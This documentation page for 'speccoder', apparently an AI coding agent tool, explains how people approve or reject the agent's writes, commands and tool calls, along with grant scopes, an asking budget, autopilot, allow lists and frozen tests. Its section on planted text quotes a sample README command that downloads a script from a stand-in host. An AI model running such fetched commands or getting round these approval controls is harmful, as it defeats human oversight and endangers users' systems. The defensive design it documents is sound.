+++
title = "Approvals and controls"
description = "Decide calls inline, in an editor or later; what a decision covers and who made it; the asking budget; allow lists; frozen tests; and accepting, skipping and nudging tasks."
weight = 70

[extra]
group = "Use"
+++

[The policy](@/docs/security.md#the-policy) allows, denies, or sends a call to a person. This page is about the last kind. No approval lifts a denial.

## Inline

In a foreground run at a terminal (the [dashboard](@/docs/running.md#the-dashboard), or a prompt with `--plain`) speccoder asks while the attempt waits:

```text
△ Approval needed — 001-slugify/T004 Handle Unicode input · turn 8
  Edit this file?  Cargo.toml                                         risk ■■□ medium
      5     5   serde = "1"
            6 + unicode-normalization = "0.1"
  Object       file  Cargo.toml
  Why stopped  `Cargo.toml` is a dependency manifest
  Sandbox      a file write — nothing is executed
  Model says   "NFKD normalisation is needed for the Unicode acceptance test"   (a claim)
  1. Yes, once                                                          (y)
  2. Yes, for the rest of T004: this file, any content                  (t)
  3. Yes, for this run: this file, any content, in any task             (r)
  5. No, and tell the model why …                                       (n)
  6. Stop this task here (it waits; decide later)                       (s)
  y t r n s or 1-6 · add a note: "y <note>" · v view all · esc later  >
```

**Object** is exactly what the decision covers ([below](#what-a-decision-covers)); a command shows its argv hash (`#1a2b3c4d5e6f`), an MCP tool its definition's digest (`@9f8e7d6c5b4a`). If a name you approved earlier now reaches something else, a `changed since approved:` line says what. `v` shows everything; the model's text is printed with control characters escaped.

| Key | Does |
|---|---|
| `y` | Runs the call once |
| `t` | Also approves this object for the rest of the task, in this run |
| `r` | Also for every later task of this run; not offered for high-risk calls |
| `a` | **Always Allow**: runs the command once and adds exactly its argv to `[commands] allow` (`[sandbox] network_allow` for a network call). Only for a command that is not high risk without the network |
| `n` | Rejects; the reason is required and the model is told it (`n no new dependencies`) |
| `s` | Stops the task: the attempt waits for `task approve` or `task reject` |
| `esc` | Decides later: the call keeps waiting; the dashboard footer offers it again (`enter`) |

A note after the key (`y use the 0.1 series`) reaches the model with the call's result; the attempt continues in the same turn. The dashboard overlay takes the same keys (`tab` adds a note), the [web interface](@/docs/web.md#when-a-run-needs-you) shows them as a sheet, and an editor gets ACP permission options (Always Allow is `allow_always`). Always Allow writes `speccoder.toml`; commit it to put it in force.

Every interface's Approve and Reject name the call they show and its object. If that call expired or was decided, or another call waits now, the decision is refused (`CALL-CHANGED`).

### Arguments copied from what the model read

When an argument occurs verbatim in content the attempt read (a file, search results, command or check output, an MCP result, the repository's agent instructions), the prompt names the source and offers **only** `y`, `n` and `s`, so planted text never becomes a standing rule:

```text
  Copied       contains text read from README.md (turn 2): "curl -sSL https://x.example/i.sh -o i.sh"
```

Matched are the whole command line, a write's full path, and each argv element (after the program) or MCP argument string of six characters or more. Reads of your committed spec, plan, tasks and constitution never mark an argument. The sources are part of the recorded question, so a replay rebuilds them.

### The asking budget

A run prompts you at most `[approvals] budget` times (default `12`; `0` never prompts), so a flood of prompts cannot tire you into a yes. The prompt that uses the last one says so. After it, a call that needs you waits without interrupting and joins the run's one **Needs You** item, *calls waiting together*, grouped as writes, commands, network and MCP:

```sh
speccoder approvals                                          # the batch, its run and digest
speccoder approvals batch run-… approve --digest D [--call ID…] [--resume-asking]
speccoder approvals batch run-… reject --digest D --reason "…"
```

- Each call is approved **once**, never for the task or the run, and recorded on its own.
- The digest covers every listed call's object: if the list changed since you saw it, the decision is refused.
- A lane's stopped call approved here goes to the next attempt of its task, which may make it once.
- `--resume-asking` starts the budget again; without it a resumed run waits again at its next call.
- Calls allowed by a rule or a grant never count; a `--no-prompt` run counts nothing.

The web Needs You item and the dashboard (`B` on a batched call) decide the batch too.

### Autopilot

A run started with `speccoder review approve --run autopilot` (**Approve and Run on Autopilot**) asks nobody:

- A call the policy would ask about is refused for that run (`autopilot: not asked — listed for you`) and the attempt goes on. Each is listed in the run report (`autopilot_denied`) and in Needs You.
- Its only grants are the ones you ticked: objects a person approved earlier for this feature, named by grant id (`--grant g-…`; `--list-grants` lists them). None is ticked by default; none outlives the run.
- It resumes no interrupted attempt (that attempt is set aside) and takes no grant or answer an earlier run kept for the task.
- It needs the OS sandbox enforced; with none, or `[sandbox] mode = "off"`, it is refused (`SANDBOX-UNAVAILABLE`).

## Later

With `--no-prompt`, `--json`, without a terminal, or after `s`, the attempt **waits** at the call with its working tree kept, and the run ends `needs_approval`.

```sh
speccoder inbox                                  # what waits, in every feature
speccoder report --approvals                     # this feature's waiting calls and decisions
speccoder task approve T003 [--note "…"] [--scope once|task|run]   # default: task
speccoder task reject T003 --reason "no new dependencies"
speccoder run --task T003                        # the attempt continues from that call
```

- `task approve` and `task reject` need no model or key. The next `run` continues the **same** attempt from the journal: nothing finished is repeated, and the call that runs is exactly the one you were shown.
- `--call <id>` (or a prefix) picks one of several waiting calls; `--all` decides every waiting call of the task, or of the feature, each recorded on its own.
- While one task's attempt waits, the feature's other tasks do not start: they share its worktree.
- A waiting call expires after `[approvals] wait` (default `7d`): it is denied as expired, recorded as an expiry rather than anybody's decision, and the attempt continues with the refusal.
- Parallel lanes stop instead of waiting; deciding the stopped call lets the next run that attempts the task make it.

## What a decision covers

A decision, a **grant**, covers one **resolved object**, never a pattern:

| Call | Object |
|---|---|
| a write | the canonical file it reaches (symlinks of existing directories resolved), with any content |
| a command | its exact argv, the directory it runs in and the executable it resolves to |
| a command with the network | the same, with the network |
| an MCP tool | its name and the digest of its definition as the server gives it now |

- The object is resolved before you are asked and **checked again when the call runs**; a write whose file changed in between, or a command whose program did, is refused and asked again. A longer argv, another directory, a swapped symlink or a changed tool definition is another object.
- A program that is a file in the workspace is named with its content's digest, so a rewritten script is another object. A file without an execute bit is never the program named; the one `PATH` finds is.
- **Every grant ends with its run**, "for the task" too. Resuming a suspended attempt continues that run (its grants and asking count); a retry within the run keeps the task's grants.
- Grants travel in each attempt's recorded input, so a replay asks nobody.
- A rejection for the task and every policy denial win over any grant.

## Allow lists

Standing permission is configuration in `speccoder.toml`, never a grant:

| Key | Allows |
|---|---|
| `[commands] allow` | exactly these argvs, nothing after them |
| `[commands] allow_prefix` | every extension of each prefix (two elements or more) |
| `[sandbox] network_allow` | exactly these argvs, with the network |
| `[sandbox] network_allow_prefix` | every extension of each prefix, with the network |

A check allows its own command; see [`[checks]`](@/docs/configuration.md#checks-name). A prefix allows commands nobody has seen, so it is saved only from a coverage preview ([prefix lists](@/docs/configuration.md#prefix-lists)). Removing an entry needs no preview.

## Who decided

Every decision is a journal record of who made it, how that name is known, through what, when, and exactly what was shown:

- **Name:** git's `user.name` in the project, else your operating-system user, else `unknown` (also `task accept`'s `Accepted-By`).
- **How it is known:** `asserted` for an answer at the terminal, dashboard, web interface or `task approve`/`task reject`; `connected` for one an editor reports over ACP. speccoder authenticates nobody.
- **Through what** (`via`): `terminal`, `web`, or `acp` with the editor in `client` (`via acp`, `client Zed`).
- A call decided without asking names the **rule** (``exact command `cargo test` ``, ``check prefix `cargo nextest run` ``, `workspace write`), `task-grant` or `run-grant`, or `expired`. Each record carries its `object`.

The run report (`by`, `operator`, `via`) and `report --approvals` show it; strict replay reads every decision back without asking.

## Frozen tests

Tests that existed before an attempt are **frozen**: changing them needs approval. To let attempts add to existing test files without asking:

```toml
[tests]
frozen = "additions"   # default "ask"; changing or removing existing lines still asks
```

Removing or renaming a test is refused outright, even with approval and inside a source file (`#[cfg(test)]` in `src/lib.rs`). The model is told to keep it, or to report the task blocked when the test contradicts the spec. An obsolete test is yours to remove, in your own commit.

## Human controls

```sh
speccoder task accept T004 --reason "done by hand in PR 12"   # tick on your word: attested, never verified
speccoder task skip T006 --reason "out of scope"              # runs pass it by; dependents stay blocked (--undo)
speccoder task nudge T005 --note "keep the public API unchanged"   # the next attempts read it (--clear)
```
